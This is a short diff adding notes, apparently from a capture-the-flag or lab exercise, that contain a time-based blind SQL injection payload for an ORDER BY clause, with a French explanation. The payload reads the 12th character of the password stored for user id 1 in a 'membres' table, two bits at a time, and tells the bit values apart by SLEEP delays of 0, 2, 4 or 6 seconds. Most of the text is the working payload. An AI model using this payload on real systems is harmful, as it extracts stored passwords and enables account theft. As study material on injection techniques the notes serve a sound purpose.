@@ -1,0 +1,27 @@
+# ASC,(
+#   SELECT (
+#     CASE FIELD(
+#       CONCAT(
+#         SUBSTRING(BIN(ASCII(SUBSTRING(password,12,1))),3,1), 
+#         SUBSTRING(BIN(ASCII(SUBSTRING(password,12,1))),4,1)  
+#       ),
+#       CONCAT(CHAR(48),CHAR(48)),
+#       CONCAT(CHAR(48),CHAR(49)),
+#       CONCAT(CHAR(49),CHAR(48)),
+#       CONCAT(CHAR(49),CHAR(49))
+#     )
+#     WHEN 1 THEN TRUE
+#     WHEN 2 THEN SLEEP(2)
+#     WHEN 3 THEN SLEEP(4)
+#     WHEN 4 THEN SLEEP(6)
+#   END) FROM membres WHERE id=1)
+
+SUBSTRING(password,12,1) : Extrait le 12e caractère du mot de passe.
+ASCII : Convertit ce caractère en son code ASCII.
+BIN(...) : transforme ce code ascii en binaire
+SUBSTRING(..., 3, 1) et SUBSTRING(..., 4, 1) : On prend le 3e et 4e bits :
+En fonction du temps de réponse, on sait ce que valent les bits:
+  00: instantané 
+  01: 2sec
+  10: 4sec
+  11: 6sec
